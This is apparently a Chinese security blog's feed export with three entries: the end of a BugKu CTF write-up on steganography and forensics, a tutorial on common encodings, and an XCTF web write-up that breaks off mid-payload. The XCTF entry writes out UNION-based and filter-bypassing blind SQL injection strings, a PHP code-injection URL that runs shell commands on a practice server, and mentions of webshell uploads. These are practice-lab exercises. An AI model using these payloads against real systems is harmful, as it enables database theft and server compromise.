Misc</b></h3><p><b>01-签到题</b></p><p>关注公众号即可</p><p><b>02-这是一张单纯的图片</b></p><p>给了张图片。隐写流程走一遍<br>hex打开发现结尾的html编码的Flag</p><p><b>03-隐写</b></p><p>CRC校验出现错误，调节高度位，得到flag</p><p><b>04-telnet</b></p><p>流量分析题，再根据题目提示，联想到Telnet是明文传输。<br>寻找telnet的登录密码。<br>懒得仔细看了...流量也很干净，直接追踪流看到了明文传输的密码得到flag。</p><p><b>05-眼见非实(ISCCCTF)</b></p><p>一个没有后缀名的文件,file查看文件类型也是zip<br>添加后缀名之后发现该压缩文件内有一个无法打开的docx文件<br>hex查文件头发现其实还是一个zip文件(office文档皆压缩)，再次修改文件后缀名...结果什么都没发现。<br>整理思路(查看wp)...<br>思路是对的，，，眼神不好使。。。flag在document里。。。</p><p><b> 06-啊哒</b></p><p>(终于遇到一个走流程的题了...)<br>压缩文件，解压出一个jpg。<br>binwalk 发现压缩包<br>foremost 提取压缩包<br>zip 打开压缩包发现flag.txt有密码<br>zip伪加密 尝试失败<br>crc爆破 22位爆破难度过高<br>整理思路(继续查看wp)...<br>行吧，还得去看图片的详细信息...得到一串奇怪的字符串<br>bp转一下ascii hex 得到解密密码。<br>拿到flag...</p><p><b>07-又一张图片，还单纯吗</b></p><p>(这次的确是一个走流程的题目了...)<br>jpg图片，直接formost即可得到flag...</p><p><b>08-猜</b></p><p>图片是一个缺了半张脸的女人，要求的flag是这个女人的名字的全拼写。<br>社工题，搜吧。<br>很容易搜到了相关连接。</p><p><b>09-宽带信息泄露</b></p><p>这个根据上一次安恒赛的一道题学习到的一个可以查看宽带备份文件密码的工具。<br>上工具读出来文件，找用户名即可。<br>文件仔细读一读救出来了。</p><p><b>10-隐写2</b></p><p>这次我记住了，这么嚣张的图片先从最简单的地方开始查起<br>文件属性直接看到hint:网络安全工作室在哪?<br>不知道，继续走流程<br>binwalk :发现zip<br>foremost :得到zip<br>然后得到 ：flag.rar和又一个提示文件。<br>提示文件说了三个人物和hint:斗地主。<br>...没猜出来(看了大佬的想法...键盘上的kqj分别对应键盘上的871...)<br>得到第三章图片,hex找到了flag。<br>提交出现问题，发下内部是base64加密，扔bp编码一下，得到真正的flag。</p><p><b>11-多种方法解决</b></p><p>提示我们去找二维码。<br>HEX发现提示：图片格式的base64加密的二维码<br>保存扫描一下得到flag。</p><p><b>12-闪的好快</b></p><p>一个闪烁的gif二维码，使用gif切割工具，<br>18张图片...一个图一个字母...<br>慢慢扫吧。</p><p><b>13-come_game</b></p><p><b>14-白哥的鸽子</b></p><p>一个jpg文件，先看一下图片是啥<br>是一只鸽子。。。</p><p><b>15-Linux</b></p><p>提示都是Linux了，先扔file看一下。<br>linux etx3文件，./无法执行。<br>尝试cat 一下直接拿到了flag。</p><p><b>16-隐写3</b></p><p><b>就五层你能解开嘛</b><br>提示很到位，一共五关。<br>第一关:crc32碰撞。.py脚本跑一下。得到解压密码:进入到了第二层。<br>第二关：维吉尼亚密码。</p><h3 id="b-0x03-Misc-b"><b>0x03- - Misc</b></h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;BugKu&lt;/h1&gt;
&lt;h3 id=&quot;b-0x00-前言-b&quot;&gt;&lt;b&gt;0x00- - 前言&lt;/b&gt;&lt;/h3&gt;
&lt;p&gt;久仰BugKu大名，这里记一下Bugku的题目。&lt;/p&gt;
&lt;h3 id=&quot;b-0x01-Web-b&quot;&gt;&lt;b&gt;0x01- - Web&lt;/b&gt;&lt;/h3&gt;
&lt;p&gt;</summary>
      
    
    
    
    <category term="CTF" scheme="http://blog.dvkunion.cn/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://blog.dvkunion.cn/tags/CTF/"/>
    
    <category term="WP" scheme="http://blog.dvkunion.cn/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>再也没有看不懂的编码！</title>
    <link href="http://blog.dvkunion.cn/2019/02/17/%E5%86%8D%E4%B9%9F%E6%B2%A1%E6%9C%89%E7%9C%8B%E4%B8%8D%E6%87%82%E7%9A%84%E7%BC%96%E7%A0%81!/"/>
    <id>http://blog.dvkunion.cn/2019/02/17/%E5%86%8D%E4%B9%9F%E6%B2%A1%E6%9C%89%E7%9C%8B%E4%B8%8D%E6%87%82%E7%9A%84%E7%BC%96%E7%A0%81!/</id>
    <published>2019-02-17T22:40:52.000Z</published>
    <updated>2023-11-03T21:25:20.032Z</updated>
    
    <content type="html"><![CDATA[<h1>再也没有看不懂的编码！</h1><p><i>2018-12-22</i></p><!-- split --><p>这一阵子做的比赛突然感觉，自己基础真的是太差了。月赛的base32码硬生生以为是base64，这才反应过来看到编码就直接扔一波工具解码碰大运，错了乱码就解不开了。其实对于编码的内容和性质、一般的形式等等跟不讲不出什么所以然来。吃了这次的亏以后，决定重新一点一点一步一步的从最基本的东西开始积累，不要在急着做一些表面的东西。</p><span id="more"></span><p><i>2019/2/17</i></p><p>终于把这篇文章算是更新完结了。<br>揣摩了大佬的编码讲解文章，修改和增添了一些内容。<br>在未来遇到更多的编码时会不断的向这其中添加。</p><hr><h2 id="b-0x00-简介-b"><b>0x00- - 简介</b></h2><p>什么是编码?区分编码和加密以及hash在于,编码只是信息的转换，其目的不在于隐蔽消息的内容，而在于方便传输以及保证传输数据内容不失真等。重点在转换为方便计算机传输的二进制数据。<br>所以个人认为，编码处理后的信息，仍可以视为是明文传输。</p><p>列一下目录：</p><ul><li><b><a href="#0x01">normal decode</a></b><ul><li>ASCII</li><li>Unicode</li><li>UTF-8</li><li>url</li><li>html编码</li></ul></li><li><b><a href="#0x02">base</a></b><ul><li>base64</li><li>base32</li><li>base16</li><li>(extends)UTF-7</li><li>Quoted-printable</li><li>uuencode/uudecode</li><li>XXencoding</li></ul></li><li><b><a href="#0x03">js decode</a></b><ul><li>aaencode</li><li>jjencode</li><li>jsfuck</li><li>社会主义核心价值观编码</li></ul></li><li><b><a href="#0x04">others</a></b><ul><li>正则表达式</li><li>Morse code</li><li>盲文编码</li><li>垃圾邮件兰格密码</li></ul></li></ul><h2 id="b-id-0x01-0x01-normal-decode-b"><b id="0x01">0x01- - normal decode</b></h2><p>这一部分写一些最最最耳熟能详的编码格式。</p><h3 id="font-color-LightSkyBlue-ascii码-font"><font color = "LightSkyBlue">ascii码</font></h3><p><b>定义</b><br>不知道 ASCII 码是不是最早意义上的编码，这种编码的出现是为了解决计算机使用二进制来进行运算和存储所有的数据。为了使用二进制来表示我们生活中所使用的字符(abcd)或是罗马数字，美国有关的标准化组织就出台了 ASCII 编码，统一规定了上述常用符号用哪些二进制数来表示。</p><p><b>编码方式</b><br>ASCII 码通常使用 7bit / 8bit 来表示一个字符。二进制所表示的十进制在这个表中一一对应即可...</p><p><a href="https://imgchr.com/i/kyH7t0"><img src="/img/kyH7t0.md.jpg" alt="kyH7t0.md.jpg"></a></p><blockquote><p>小结</p><ul><li>1.标准ascii码是7bit+1bit补零。所以在标准的ascii码中只有127个字符</li><li>2.数字部分48-57,大写字母65-90,小写字母96到122</li></ul></blockquote><h3 id="font-color-LightSkyBlue-Unicode-font-br"><font color = "LightSkyBlue">Unicode</font><br></h3><p><b>定义</b><br>在ascii码出现之后，各个国家为了适应自己国家语言分分独立研发的编码体制。如GB2312,来弥(mi)补ascii码的不足。出现了非常混乱的编码现象。因此Unicode应情而生。<br>Unicode也叫统一码，万国码。满足了跨语言、跨平台进行文本转换、处理的要求。1990年开始研发，1994年正式公布。</p><p><b>编码方式</b><br>Unicode统一使用两个字节表示一个字符，对于英文只需要把高字节填零即可。这样既能表示了英文也可以表示中文。因此对于英文的Unicode编码就是明文本身(大写会变为小写)。</p><p><a href="http://www.bejson.com/convert/unicode_chinese/">Unicode在线转换工具</a></p><h3 id="font-color-LightSkyBlue-UTF-8-font-br"><font color = "LightSkyBlue">UTF-8</font><br></h3><p><b>定义</b><br>看了Unicode编码后，很容易发现这样的编码一下子就把存储量翻了一个倍。对于英文来说，浪费了大量的存储空间。于是又产生了UTF-8编码。<br>UTF-8就是在Unicode的编码上，对Unicode进行分组处理。</p><p><b>编码方式</b></p><p>处理方式如下表：</p><table><thead><tr><th><b>Unicode编码(十六进制)</b></th><th><b>UTF-8 字节流(二进制)</b></th></tr></thead><tbody><tr><td>000000-00007F</td><td>0xxxxxxx</td></tr><tr><td>000080-0007FF</td><td>110xxxxx 10xxxxxx</td></tr><tr><td>000800-00FFFF</td><td>1110xxxx 10xxxxxx 10xxxxxx</td></tr><tr><td>010000-10FFFF</td><td>11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</td></tr></tbody></table><p>对不同Unicode编码段进行不同字节的编码处理。节省了大量的空间。</p><p>例：Unicode编码0x20C30在0x010000-0x10FFFF之间，使用4字节模板：11110xxx 10xxxxxx 10xxxxxx 10xxxxxx。将0x20C30写成21位二进制数字（不足21位就在前面补0）：0 0010 0000 1100 0011 0000，用这个比特流依次代替模板中的x，得到：11110000 10100000 10110000 10110000，即F0 A0 B0 B0。<br>同样的还存在UTF-16、UTF-32，但是只有UTF-8才兼容ASCII码</p><h3 id="font-color-LightSkyBlue-Url编码-font-br"><font color = "LightSkyBlue">Url编码</font><br></h3><p>对于url编码，是因为对于url有许多歧义的符号。如：'&amp;'、'=' 等。<br>我们依旧从定义开始了解。</p><p><b>定义</b></p><p>讲到底，到底什么是url。不知道，继续找度娘：<br>url(Uniform/Universal Resource Locator)是统一资源定位符，对可以从互联网上得到的资源的位置和访问方法的一种简洁的表示，是互联网上标准资源的地址。互联网上的每个文件都有一个唯一的URL，它包含的信息指出文件的位置以及浏览器应该怎么处理它。<br>它最初是由蒂姆·伯纳斯·李发明用来作为万维网的地址。现在它已经被万维网联盟编制为互联网标准RFC1738了。（来源百度百科）</p><p>P.S.又发现了一个和这个东西很像的一个玩意，叫做URI，那么在简单地写一下什么是URI吧。</p><p>URI:(Uniform Resource Identifier)统一资源标识符，URI 属于 URL 更低层次的抽象，一种字符串文本标准。就是说，URI 属于父类，而 URL 属于 URI 的子类。URL 是 URI 的一个子集。</p><p>URL的格式如下：协议：<a href="//%E7%94%A8%E6%88%B7%E5%90%8D:%E5%AF%86%E7%A0%81@xn--eqrt2grvd.xn--eqrt2g.xn--eqrt2g7w0ccuv">//用户名:密码@子域名.域名.顶级域名</a>:端口号/目录/文件名.文件后缀?参数=值#标志。<br>（标准化一下）：scheme://host[:port#]/path/.../[;url-params][?query-string][#anchor]</p><p>依旧举个例子比较好理解：例如我的一篇博客的地址：<br><a href="https://blog.dvkunion.cn/2018/10/17/python3-learning%E2%91%A0/">https://blog.dvkunion.cn/2018/10/17/python3-learning①/</a></p><p>它的第一部分--scheme：协议/模式，在上例中就是指 'https://' 部分<br>第二部分--authority：IP/域名+端口号，在上例中就是指 '<a href="http://dvkunion.github.io">dvkunion.github.io</a>' 部分，端口号被省略，默认为80端口。<br>第三部分--path：路径，在上例中就是指 '/2018/10/17/....' 部分，指访问的主机目录。<br>可能后面还会带有？(query)和一些参数(fragment),基本结构就是这样。</p><p>根据文档规定，URL中只允许出现 大小写字母(a-z)&amp;(A-Z)、数字(0-9)、'-'、'_'、'~'、'·' 这些符号。<br>保留字符有：! * ' ( ) ; : @ &amp; = + $ , / ? # [ ]<br>不安全字符：空格、引号、尖括号、#、%、{}|^[]`~之类。</p><p><b>编码方式<b></p><p>URL也称为 %编码,其编码方式非常简单，只需要使用US-ASCII将字符转化为十六进制字符并加一个%即可。<br>要注意URL编码采用的是ASCII而不是Unicode，所以url内不能存在中文。<br>如下是js三个函数的url编码规则：即不对一下字符进行编码。</p><p>escape（69个）：<em>/@+-._0-9a-zA-Z<br>encodeURI（82个）：!#$&amp;'()</em>+,/:;=?@-.<em>~0-9a-zA-Z<br>encodeURIComponent（71个）：!'()*-.</em>~0-9a-zA-Z</p><h3 id="font-color-LightSkyBlue-Html编码-font-br"><font color = "LightSkyBlue">Html编码</font><br></h3><p><b>定义</b><br>同url一样，html编码也是为了防止歧义。</p><p><b>编码方式</b><br>其实常用的只是过滤了几个关键的字符，其他的依旧是十六进制的表示ASCII码的方法。</p><table><thead><tr><th>字符</th><th>十进制</th><th>十六进制数字</th><th>转义字符</th></tr></thead><tbody><tr><td>&quot;</td><td><code>&amp;#34;</code></td><td><code>&amp;#x22; </code></td><td><code>&amp;quot;</code></td></tr><tr><td>&amp;</td><td><code>&amp;#38;</code></td><td><code>&amp;#x26;</code></td><td><code>&amp;amp;</code></td></tr><tr><td>&lt;</td><td><code>&amp;#60;</code></td><td><code>&amp;#x3C;</code></td><td><code>&amp;lt;</code></td></tr><tr><td>&gt;</td><td><code>&amp;#62;</code></td><td><code>&amp;#x3E;</code></td><td><code>&amp;gt;</code></td></tr><tr><td>不断开空格</td><td><code>&amp;#160;</code></td><td><code>&amp;#xA0;</code></td><td><code>&amp;nbsp;</code></td></tr></tbody></table><p><b><font color="red">注意不能丢掉分号！</font></b></p><h2 id="b-id-0x02-0x02-base-b"><b id=0x02>0x02- - base</b></h2><p>吃过最多次亏的一个编码，最早认为后面有两个==的就是base64...而且只知道一个base64...<br><a href="https://www.qqxiuzi.cn/bianma/base.php?type=16">base全家福</a></p><h3 id="font-color-LightSkyBlue-base64-font-br"><font color = "LightSkyBlue">base64</font><br></h3><p><b>定义</b></p><p>Base64是网络上最常见的用于传输<font color = "red">8Bit字节码的编码</font>方式之一，Base64就是一种基于64个可打印字符来表示二进制数据的方法。可查看RFC2045～RFC2049，上面有MIME的详细规范。</p><p>Base64编码是从二进制到字符的过程，可用于在HTTP环境下传递较长的标识信息。例如，在Java Persistence系统Hibernate中，就采用了Base64来将一个较长的唯一标识符（一般为128-bit的UUID）编码为一个字符串，用作HTTP表单和HTTP GET URL中的参数。在其他应用程序中，也常常需要把二进制数据编码为适合放在URL（包括隐藏表单域）中的形式。此时，采用Base64编码具有不可读性，需要解码后才能阅读。(来源于百度百科)</p><p>由于某些系统中只能使用ASCII字符。Base64就是用来将非ASCII字符的数据转换成ASCII字符的一种方法。</p><p>base64特别适合在http，mime协议下快速传输数据。</p><p><b>编码方式</b></p><p><img src="/img/006IjVYfgy1fyfwmuac6lj30hv0dg74g.jpg" alt=""></p><p>如图可见，base64用64个可以打印的ASCII字符来转换任意的二进制,2^6=64,所以base64以6位一分割，且分割的之前的二进制应该为24的倍数（6、8的最小公倍数），不足的位数用base通用补码'='补齐。</p><p>举个例子会更好理解：<br><img src="/img/006IjVYfgy1fyfw58qtsrj30iz04ht8l.jpg" alt=""></p><p>当位数不足时候，先用0把前面的凑出一个6位，再用'='可以补出24的倍数即可。所以，可以总结出：</p><p><b><font color = "red">在Base64中4个字符为一个块，对应铭文中的三个字符。因此Base64编码后会比原文本多出1/3左右</font></b></p><p>因此我们可以轻松的依此计算：DVKD----&gt;RFZLRA==；DVKDV----&gt;RFZLRFY=；DVKDVK----&gt;RFZLRFZL</p><h3 id="font-color-LightSkyBlue-base32-font-br"><font color = "LightSkyBlue">base32</font><br></h3><p><b>定义</b></p><p>Base32看名字就知道和64不会相差很多，只是用32个字符来进行编码。2^5=32,所以5位一分割，公倍数40(5,8)。所以必须是40倍数。</p><p><b>编码方式</b></p><p><img src="/img/006IjVYfgy1fyfwmt5r59j30fi0dimx6.jpg" alt=""></p><p><img src="/img/006IjVYfgy1fyfxbvaiwsj30qg04lwef.jpg" alt=""></p><p>明文五个字符---&gt;转码八个字符。</p><h3 id="font-color-LightSkyBlue-base16-font-br"><font color = "LightSkyBlue">base16</font><br></h3><p><b>定义</b></p><p>Base家族也就这样了，大同小异。16个字符，2^4=16,4位一分割，公倍数8(4,8)。8的倍数即可。</p><p><b>编码方式</b></p><p><img src="/img/006IjVYfgy1fyfwrl8o1pj30fl0bja9y.jpg" alt=""></p><p><img src="/img/006IjVYfgy1fyfxj1io0tj30ix04g746.jpg" alt=""></p><blockquote><p><b>总结</b></p><ul><li>1.base64中包含大写字母、小写字母、数字1~9以及特殊字符'+'和'/'</li><li>2.base64为6bit一转换，所以编码后通常比明文多1/3</li><li>3.base64常用于传输，注意是传输，如UTF-8编码的中文，可以通过Base64进行良好的传输。</li><li>4.base32中只包含大写字母、数字2~7</li><li>5.base32为5bit一转换,由于其编码不包含'',其结果可以用作文件名。</li><li>6.base32比base64多出 20% 左右的大小，通常比明文多3/5</li><li>7.base16中只包含数字0~9以及大写字母'A'~'F'</li><li>8.base16为4bit一转换，所以编码结果准确的为明文的一倍，且不存在填充用的'='</li></ul></blockquote><h3 id="font-color-LightSkyBlue-UTF-7-font-br"><font color = "LightSkyBlue">UTF-7</font><br></h3><p><b>定义</b><br>UTF-7 是base64的修改版，主要目的是为了将UTF-16的数据用Base64的方法进行编码传输。</p><p><b>编码方式</b><br>UTF-7编码的规则为：</p><p>1&gt; UTF16小于等于 0x7F 的字符，采用ASCII编码；<br>2&gt; UTF16大于0x7F的字符，采用Base64编码，然后在首尾分别加上+-；<br>3&gt; UTF-7编码后，所有字符均小于等于 0x7F。</p><p><a href="http://toolswebtop.com/text/process/decode/UTF-7">UTF-7在线工具</a></p><h3 id="font-color-LightSkyBlue-Quoted-printable-font-br"><font color = "LightSkyBlue">Quoted-printable</font><br></h3><p><b>定义</b><br>同base64一样，Quoted-printable也是用于满足将非ASCII码转化为ASCII码。可译为“可打印字符引用编码”、“使用可打印字符的编码”。当非ASCII字符较少时，Quoted-printable有着较好的可读性。</p><p><b>编码方式</b></p><p>Quoted-printable编码规则为：将任意一个8 bit 表示为：一个'='和两个十六进制字符。</p><p><a href="https://www.w3cschool.cn/tools/index?name=decode_encode_tool">Quoted-printable在线工具</a></p><h3 id="font-color-LightSkyBlue-uuencode-uudecode-font-br"><font color = "LightSkyBlue">uuencode/uudecode</font><br></h3><p><b>定义</b></p><p>uuencode这个名字是衍生自&quot;Unix-to-Unix encoding&quot;，原先是Unix系统下将二进制的资料借由uucp邮件系统传输的一个编码程式，是一种二进制到文字的编码。</p><p><b>加密方式</b><br>uuencode编码序列：从ascii码的32位算为uudecode的0位。<br>uuencode只是格式复杂。其编码同base64一样，只是每一组都要加32。</p><p>例如：cat 加密后-&gt; #8V%T<br>begin 644 为uudecode标识。</p><p><code>begin 644 cat.txt</code><br><code>#8V%T</code><br>`<br><code>end</code></p><h3 id="font-color-LightSkyBlue-XXencode-font-br"><font color = "LightSkyBlue">XXencode</font><br></h3><p><b>定义</b></p><p>Xxencode是一种类似于uuencode的一种二进制到文字的编码，它只使用字母数字字符，以及加号和减号。也是一种用于传输文件的编码格式。</p><p><b>编码方式</b><br>xxencode编码序列: '+-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'<br>uuencode不去减32直接转化为xxencode码就是xxencode</p><p><a href="http://web.chacuo.net/charsetxxencode">uuencode &amp;&amp; xxencode 工具</a></p><h2 id="b-id-0x03-0x03-JS-b"><b id=0x03>0x03- - JS</b></h2><p>在url中提到，js对url有三种编码函数，其不编码的字符分别如下：<br>escape（69个）：<em>/@+-._0-9a-zA-Z<br>encodeURI（82个）：!#$&amp;'()</em>+,/:;=?@-.<em>~0-9a-zA-Z<br>encodeURIComponent（71个）：!'()*-.</em>~0-9a-zA-Z</p><p>同时js还有着几种特殊的编码</p><h3 id="font-color-LightSkyBlue-Aencode-font-br"><font color = "LightSkyBlue">Aencode</font><br></h3><p>一种将js编码转化为颜文字的编码格式<br><a href="https://www.sojson.com/aaencode.html">AAencode在线工具-1</a><br><a href="https://tool.zcmzcm.org/aadecode">AAdecode在线工具-2</a></p><h3 id="font-color-LightSkyBlue-JJencode-font-br"><font color = "LightSkyBlue">JJencode</font><br></h3><p>一种将js编码转化为非正常编码的格式<br><a href="https://www.sojson.com/jjencode.html">JJencode在线工具</a></p><h3 id="font-color-LightSkyBlue-JSfuck-font-br"><font color = "LightSkyBlue">JSfuck</font><br></h3><p>一种将js编码转化为![]等符号的编码格式。<br><a href="http://utf-8.jp/public/jsfuck.html">jsfuck在线工具</a></p><p>基本js的加密都是不可逆的，所以只能在控制台观察一下运行结果。</p><h3 id="font-color-LightSkyBlue-社会主义核心价值观编码-font-br"><font color = "LightSkyBlue">社会主义核心价值观编码</font><br></h3><p>...这个第一次见到时候也是挺无语的...<br><a href="https://github.com/sym233/core-values-encoder">js源码开放</a><br><a href="https://sym233.github.io/core-values-encoder/">在线工具-1</a><br><a href="https://atool.vip/morse">在线工具-2</a> (这个很强大)</p><h2 id="b-id-0x04-0x04-Others-b"><b id= 0x04>0x04- - Others</b></h2><h3 id="font-color-LightSkyBlue-Morse-code-font-br"><font color = "LightSkyBlue">Morse code</font><br></h3><p>这个就已经很古老了.....直接对应表查表就好了。<br>有些地方把这个算作密码......我觉得还是莫尔斯还是一种编码的性质，作为信息的传输作用，并没有隐藏信息的功能。</p><p>莫尔斯电码表：<br><a href="https://imgchr.com/i/k69H4e"><img src="/img/k69H4e.md.jpg" alt="k69H4e.md.jpg"></a></p><p><a href="http://www.atool.org/morse.php">在线文字转莫尔斯电码工具</a></p><h4 id="参考链接">参考链接</h4><blockquote><p>0.![kyH7t0.md.jpg : /img/kyH7t0.md.jpg]<br>1.Unicode在线转换工具 : <a href="http://www.bejson.com/convert/unicode_chinese/">http://www.bejson.com/convert/unicode_chinese/</a><br>2.base全家福 : <a href="https://www.qqxiuzi.cn/bianma/base.php?type=16">https://www.qqxiuzi.cn/bianma/base.php?type=16</a><br>3.UTF-7在线工具 : <a href="http://toolswebtop.com/text/process/decode/UTF-7">http://toolswebtop.com/text/process/decode/UTF-7</a><br>4.Quoted-printable在线工具 : <a href="https://www.w3cschool.cn/tools/index?name=decode_encode_tool">https://www.w3cschool.cn/tools/index?name=decode_encode_tool</a><br>5.uuencode &amp;&amp; xxencode 工具 : <a href="http://web.chacuo.net/charsetxxencode">http://web.chacuo.net/charsetxxencode</a><br>6.AAencode在线工具-1 : <a href="https://www.sojson.com/aaencode.html">https://www.sojson.com/aaencode.html</a><br>7.AAdecode在线工具-2 : <a href="https://tool.zcmzcm.org/aadecode">https://tool.zcmzcm.org/aadecode</a><br>8.JJencode在线工具 : <a href="https://www.sojson.com/jjencode.html">https://www.sojson.com/jjencode.html</a><br>9.jsfuck在线工具 : <a href="http://utf-8.jp/public/jsfuck.html">http://utf-8.jp/public/jsfuck.html</a><br>10.js源码开放 : <a href="https://github.com/sym233/core-values-encoder">https://github.com/sym233/core-values-encoder</a><br>11.在线工具-1 : <a href="https://sym233.github.io/core-values-encoder/">https://sym233.github.io/core-values-encoder/</a><br>12.在线工具-2 : <a href="https://atool.vip/morse">https://atool.vip/morse</a><br>13.![k69H4e.md.jpg : /img/k69H4e.md.jpg]<br>14.在线文字转莫尔斯电码工具 : <a href="http://www.atool.org/morse.php">http://www.atool.org/morse.php</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h1&gt;再也没有看不懂的编码！&lt;/h1&gt;
&lt;p&gt;&lt;i&gt;2018-12-22&lt;/i&gt;&lt;/p&gt;
&lt;!-- split --&gt;
&lt;p&gt;这一阵子做的比赛突然感觉，自己基础真的是太差了。月赛的base32码硬生生以为是base64，这才反应过来看到编码就直接扔一波工具解码碰大运，错了乱码就解不开了。其实对于编码的内容和性质、一般的形式等等跟不讲不出什么所以然来。吃了这次的亏以后，决定重新一点一点一步一步的从最基本的东西开始积累，不要在急着做一些表面的东西。&lt;/p&gt;</summary>
    
    
    
    <category term="Crypto" scheme="http://blog.dvkunion.cn/categories/Crypto/"/>
    
    
    <category term="常用编码" scheme="http://blog.dvkunion.cn/tags/%E5%B8%B8%E7%94%A8%E7%BC%96%E7%A0%81/"/>
    
    <category term="密码学" scheme="http://blog.dvkunion.cn/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>XCTF - 部分WP</title>
    <link href="http://blog.dvkunion.cn/2019/02/16/XCTF/"/>
    <id>http://blog.dvkunion.cn/2019/02/16/XCTF/</id>
    <published>2019-02-16T19:41:43.000Z</published>
    <updated>2023-11-03T21:25:20.032Z</updated>
    
    <content type="html"><![CDATA[<h1>XCTF</h1><h3 id="b-0x00-前言-b"><b>0x00- - 前言</b></h3><p>找到这个地方也是几经周折...发现自己错过了Hgame...然后不甘心的一顿搜索，结果撞到这个地方。<br>不说了，刷起。</p><h3 id="b-0x01-Web-b"><b>0x01- - Web</b></h3><h4 id="font-color-blue-level-1-新手练习-font-br"><font color = "blue">level.1--新手练习</font><br></h4><p><b>01-view_source</b></p><p>题目提示使用view_source来查看源码。直接查看即可得到flag。<br>F12效果相同</p><p><b>02-get_post</b></p><p>第一步提示get发送一个a=1<br>第二步提示post发送一个b=2<br>hackbar发送得到flag。</p><p><b>03-robots</b></p><p>Robots协议，联想到robots.txt<br>查看robots.txt得到hint:flag_1s_h3re.php，访问得到flag。</p><p><b>04-backup</b></p><p>打开页面得到提示：你知道index.php的备份文件名吗？<br>备份文件名为index.php.bak,下载保存，查看源码得到flag。</p><p><b>05-cookie</b></p><p>题目提示很到位，直接查看请求包cookie得到hint:cookie.php。<br>访问得到下一个hint：http_response。<br>查看响应包得到flag。</p><p><b>06-disabled_button</b></p><p>前端问题，F12修改前端代码之后点击即可。<br>也可以直接构造请求包。</p><p><b>07-simple_js</b></p><p>js问题，访问之后是一个js窗要求输入密码<br>查看源码，观察js代码。<br>可以写出解密python脚本：<br>对实际password直接输出得到ascii码值，输出其ascii码即是Flag。</p><p><b>08-xff_referer</b></p><p>提示伪造xff和referer。<br>伪造即可得到flag。<br>浏览器修改的话回音藏到后面，F12查看源码。</p><p><b>09-weak_auth</b></p><p>尝试登陆，提示密码错误，你可能需要一个字典。<br>弱密码爆破得到flag。<br>这里看教程拿到了一个字典库：<br><a href="https://github.com/rootphantomer/Blasting_dictionary">字典</a></p><p><b>010-webshell</b></p><p>一句话木马，菜刀连一下。<br>直接看到flag.txt。得到flag</p><p><b>011-command_execution</b></p><p>命令注入，相当于DVWA的Low level。<br>cat /home flag.txt</p><p><b>012-simple_php</b></p><p>阅读php代码按要求输入即可...<br>a:科学计数法绕过。<br>b:%00截断。</p><h4 id="font-color-blue-level-2-萌新入坑-font-br"><font color = "blue">level.2--萌新入坑</font><br></h4><p><b>01-upload</b></p><p>打开是一个文件上传窗，随便上传一个发现回显路径;访问路径成功。<br>尝试上传一句话木马：提示只能上传jpg，但是文件栏成功显示一句话木马文件，只是上传按钮变灰。<br>联想到了是前端的过滤，禁用JS进行尝试。<br>成功上传一句话木马，菜刀连接。得到flag。</p><p><b>02-NewsCenter</b></p><p>发现存在post注入点。<br>手动注入：<br><code>1' order by 3# </code> 存在3列</p><p><code>1' union select 1,2,3</code> 查看回显位置</p><p><code>1' union select 1,2,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA#</code>或者<code>1' union select 1,2,schema_name from information_schema.schemata#</code>查看存在哪些数据库。</p><p><code>1' union select 1,2,user()#</code>查看用户。</p><p><code>1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='news'#</code>查看new内有哪些表单。</p><p><code>1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='secret_table'#</code>查看sercet_table下的列名。</p><p><code>1' union select 1,2,fl4g from secret_table#</code>查询数据得到flag。</p><blockquote><p>自己手动注入那叫一个差劲啊</p></blockquote><p><b>03-Training-Get-Resourced</b></p><p>题目描述不让看注释，就去看看注释<br>啊，有了...(这难度星级是随便打的嘛...)</p><p><b>04-Triangle</b></p><p>没有任何提示，先打开看看。<br>一个要求输入Flag的页面。<br>看到了后面的js脚本。。。<br>ok，不会，看题解了。<br>这是一道JS逆向题...<br>console可以看到关键的三个函数。。。<br>题目解释说是unicorn.js的一个ARM仿真加密，需要IDE逆向...</p><p><b>05-mfw</b></p><p>首先发现了注释：my secret，而url仿佛存在任意文件访问漏洞。然而尝试后发现会有detect保护。<br>继续查看剩下的页面，发现组成部分中包含：GIT<br>难道是git泄露？<br>ok,发现.git文件目录。学习了gitTools使用方法，下载到了源码。<br>看到index.php内存在一个这样的语句</p><p><code>$file = &quot;templates/&quot; . $page . &quot;.php&quot;;</code></p><p>这里存在着任意命令执行漏洞。</p><p>构造<code>111.198.29.45:31701/index.php?page=%27.system(&quot;cd%20../../../;%20ls%20-lA;&quot;).%27about</code></p><p>这里大神还给出了一个小技巧，使用view-source可以格式化查看结果。<br>查看flag.php，得到flag<br>这里我完全是瞎猫碰死耗子。。。大佬解释了为什么.git内不存在flag内容而通过上述操作的就存在答案。因为对git的命令和原理根本不熟悉。</p><p>大佬重审了git下载的库,发现主机内的flag.php文件被修改，但是还没有提交，使用<code>git diff</code>命令进行对比，得到了flag...</p><blockquote><p>follow the master,（跟随大师，）</p><p>and walk with the master,（与大师通行，）</p><p>新增支线任务：学习git</p></blockquote><p><b>06-ics-06</b></p><p>以为又是注入...结果发现根本不是一个注入点。<br>后来想了想题面提示，只有一个。<br>...不会让我爆破id把。。。<br>然后测了一下id=9999999都不报错....<br>行吧，爆破下把。<br>OK,2333<br>的确是送分题，感觉很恶心。。。（如果我爆破只跑了2222怎么办？）</p><p><b>07-upload</b></p><p>看题目意思应该是一个上传题目。<br>测试一下，发现只能够上传jpg图片文件。<br>行吧，卡住了，找大佬去了。<br>然后说这是一个注入题。。。文件名的二次注入(这谁扛得住啊...)<br>先去默默地了解下二次注入...(sqliab)<br>二次注入的思路是先将脏数据存入到数据库中，再取出的过程中完成对Sql语句的污染。<br>。。。二次注入的大佬思路没看懂...这里使用了另一个大佬的盲注,通过insert注入回显。：</p><p><code>1' &amp; (( seleselectct count(table_name) frfromom information_schema.tables where table_schema=database())=1)&amp; '1.jpg&quot;</code></p><p>获取表的数量</p><p><code>filename=&quot;1' &amp; (sselectelect (seselectlect length(table_name) frofromm information_schema.tables where table_schema=database() limit 0,1)&gt;8)&amp; 